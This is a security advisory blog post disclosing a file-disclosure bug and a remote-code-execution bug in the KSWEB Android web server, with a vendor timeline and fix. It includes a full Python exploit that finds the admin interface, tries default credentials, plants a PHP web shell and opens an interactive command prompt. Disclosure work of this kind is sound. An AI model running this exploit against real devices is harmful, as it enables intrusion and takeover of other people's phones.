---
layout: post
title: KSWEB for Android Remote Code Execution
date: 2019-10-02
categories:
  - android
  - mobile
  - security
tags:
  - CVE-2019-15766
  - CVE-2019-16198
  - ksweb
  - web-server
  - php
  - rce
  - lfi
image: /assets/images/2019-10-02-ksweb-android-remote-code-execution/ksweb-shell.jpg
---
KSWEB is an Android application used to allow an Android device to act as a web server. Bundled with this mobile application, are several management tools with one-click installers which are installed with predefined sets of credentials.

One of the tools, is a tool developed by the vendor of KSWEB themselves; which is KSWEB Web Interface. This web application allows authenticated users to update several core settings, including the configuration of the various server packages.

As can be seen in the screenshot below (which also shows a local file disclosure via the `hostFile` parameter), the selected file is made visible in a text editor and the changes can be saved by clicking the button in the top right corner of the editor.

![](/assets/images/2019-10-02-ksweb-android-remote-code-execution/lfi.png)

When the save button is hit, a request is sent to the AJAX handler, like this:

```http
POST /includes/ajax/handler.php HTTP/1.1
Host: localhost:8002
Connection: keep-alive
Content-Length: 1912
Authorization: Basic YWRtaW46YWRtaW4=
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
Sec-Fetch-Mode: cors
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost:8002
Sec-Fetch-Site: same-origin
Referer: http://localhost:8002/?page=5
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

act=save_config&configFile=%2Fdata%2Fdata%2Fru.kslabs.ksweb%2Fcomponents%2Fmysql%2Fconf%2Fmy.ini&config_text=**long config file content ommitted*
```

As can be seen in the above request, the full path to the file being written to is found in the `configFile` field. As there is no whitelist of files that can be written to, and due to the write permissions of the KSWEB Web Interface application directory not being restricted, it is possible to use this to write a PHP file to the `/data/data/ru.kslabs.ksweb/components/web/www/` directory, which will provide command execution.

Additionally, KSWEB supports running as root, meaning that if the user has allowed access as root, full control of the device can be gained via this vulnerability, as can be seen in the screenshot of the PoC below:

![](/assets/images/2019-10-02-ksweb-android-remote-code-execution/ksweb-shell.jpg)

Play Store Installs
-------------------
100,000+

Play Store Link
---------------
[https://play.google.com/store/apps/details?id=ru.kslabs.ksweb&gl=GB](https://play.google.com/store/apps/details?id=ru.kslabs.ksweb&gl=GB)

Solution
--------
Upgrade to version 3.94 or later

CVSS v3 Vector
--------------
[AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N/E:P/RL:W/RC:R](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N/E:P/RL:W/RC:R)

Disclosure Timeline
-------------------
- **2019-08-27**: Vulnerability found, vendor contacted
- **2019-08-27**: CVE requested
- **2019-08-29**: CVE-2019-15766 assigned for the RCE
- **2019-08-29**: Vendor responded to confirm issue will be being fixed in an update
- **2019-09-10**: CVE-2019-16198 assigned for the LFD vulnerability
- **2019-09-21**: Contact vendor to check status of patch
- **2019-10-01**: Version 3.94 released to fix vulnerabilities

Proof of Concept
----------------
```python
import requests
import sys

from requests.auth import HTTPBasicAuth

BOLD = '\033[1m'
GREEN = '\033[92m'
FAIL = '\033[93m'
RESET = '\033[0m'

if len(sys.argv) < 2:
    print 'Usage: python {file} target_ip [username] [password]'.format(file = sys.argv[0])
    sys.exit(1)

username = sys.argv[2] if len(sys.argv) > 2 else 'admin'
password = sys.argv[3] if len(sys.argv) > 2 else 'admin'
host = sys.argv[1]

base_url = ''

def print_action (msg):
    print '{b}{g}[+]{r} {msg}'.format(b = BOLD, g = GREEN, r = RESET, msg = msg)

def print_error (msg):
    print '{b}{f}[!]{r} {msg}'.format(b = BOLD, f = FAIL, r = RESET, msg = msg)

def run_cmd (cmd, hide_output = False):
    r = requests.get('{b}/ksws.php?1={c}'.format(b = base_url, c = cmd), auth=(username, password))

    if not hide_output:
        print r.text.rstrip()

    return r.status_code == 200

print '  _  __ _______          ________ ____     _____ _          _ _ '
print ' | |/ // ____\\ \\        / /  ____|  _ \\   / ____| |        | | |'
print ' | \' /| (___  \\ \\  /\\  / /| |__  | |_) | | (___ | |__   ___| | |'
print ' |  <  \\___ \\  \\ \\/  \\/ / |  __| |  _ <   \\___ \\| \'_ \\ / _ \\ | |'
print ' | . \\ ____) |  \\  /\\  /  | |____| |_) |  ____) | | | |  __/ | |'
print ' |_|\\_\\_____/    \\/  \\/   |______|____/  |_____/|_| |_|\\___|_|_|\n'

port = 8000

print_action('Scanning for WebFace port...')
while port < 8100:
    try:
        r = requests.get('http://{h}:{p}'.format(h = host, p = port))
        if r.status_code == 401 and 'for KSWEB' in r.headers['Server']:
            print_action('Found WebFace on port {p}'.format(p = port))
            break
        else:
            port = port + 1
    except:
        port = port + 1


base_url = 'http://{h}:{p}'.format(h = host, p = port)

try:
    print_action('Testing credentials ({u}:{p})...'.format(u = username, p = password))
    r = requests.get(base_url, auth=(username, password))

    if r.status_code != 200:
        print_error('The specified credentials ({u}:{p}) were invalid'.format(u = username, p = password))
        sys.exit(1)
except:
    print_error('An error occurred connecting to the host')
    sys.exit(2)

print_action('Uploading web shell...')
r = requests.post('{b}/includes/ajax/handler.php'.format(b = base_url), auth=(username, password), data={
        'act': 'save_config',
        'configFile': '/data/data/ru.kslabs.ksweb/components/web/www/ksws.php',
        'config_text': '<?=`$_GET[1]`?>'
    })

print
run_cmd('uname -a')
run_cmd('pwd')

while True:
    cmd = raw_input('$: ')
    if cmd.lower() == 'exit':
        break
    else:
        run_cmd(cmd)

print

print_action('Cleaning up...')
if not run_cmd('rm /data/data/ru.kslabs.ksweb/components/web/www/ksws.php'):
    print_error('Failed to delete the web shell from the target')

```
